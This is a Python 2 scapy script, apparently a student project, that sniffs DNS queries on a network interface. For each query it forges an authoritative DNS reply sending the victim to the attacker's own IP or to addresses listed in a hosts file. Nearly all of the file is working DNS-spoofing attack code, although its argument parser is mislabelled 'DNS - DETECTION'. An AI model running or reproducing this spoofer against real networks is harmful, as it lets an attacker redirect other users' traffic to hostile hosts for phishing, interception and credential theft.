#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
Created on Sat Dec  9 00:09:54 2017
@author: sharmila24
"""
import os
import sys
from scapy.all import *
import argparse

import socket

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    x= s.getsockname()[0]
    s.close()
    return x

def make_spoofed_pkt(spoofed_ip,pkt):
    print "MAKING MY PACKET"
    print spoofed_ip
    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                     UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                     DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=pkt[DNS].qd.qname,ttl=10, rdata=spoofed_ip))
    send(spoofed_pkt)
    print spoofed_pkt.show()

def packet_sniffer(network,bpf_filter):
    if network:
        print bpf_filter
        sniff(filter=bpf_filter, iface=network,store=0, prn=dns_spoof)
    else:
        print bpf_filter
        sniff(filter=bpf_filter, store=0, prn=dns_spoof)

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR) and pkt[DNS].qr==0:
        domain = pkt[DNSQR].qname
        if hostname is None:
            default_redirected_ip = get_local_ip()
            #get_local_ip()
                #when hostname is not given to be redirected to the default destination
            print "filename not entered,user default ip"
            make_spoofed_pkt(default_redirected_ip,pkt)
        else:
            with open(hostname) as fp:
                lines = fp.readlines()
                lines = [x.strip() for x in lines]
                dict_host={}
                for content in lines:
                    ip_value ,domain_name = content.split(" ")
                    dict_host[domain_name] = ip_value
                    if pkt[DNSQR].qname in dict_host:
                        make_spoofed_pkt(dict_host[pkt[DNSQR].qname],pkt)

def argument_parser():
    ter_parser = argparse.ArgumentParser(description=" DNS - DETECTION ")
    ter_parser.add_argument("-i")
    ter_parser.add_argument("-r") 
    ter_parser.add_argument('bpf_filter', nargs='*',type =str)
    arg_all = ter_parser.parse_args()
    return arg_all.i, arg_all.r, arg_all.bpf_filter

if __name__ == '__main__':
    network, hostname, bpf_filter = argument_parser()
    print "nut not here"
    string=""
    if network and hostname:
        print "Network is  {0}".format(network) , "Hostname is {0}".format(hostname)
        #print type(bpf_filter)
        if bpf_filter:
            for i in bpf_filter:
                string =string + i
            #print "BPF FILTER  is {0}".format(string)
            string= string+ " udp port 53"
            packet_sniffer(network,string)
    else:
        if not network:
            network = None
            string=string+ " udp port 53"
            packet_sniffer(network,string)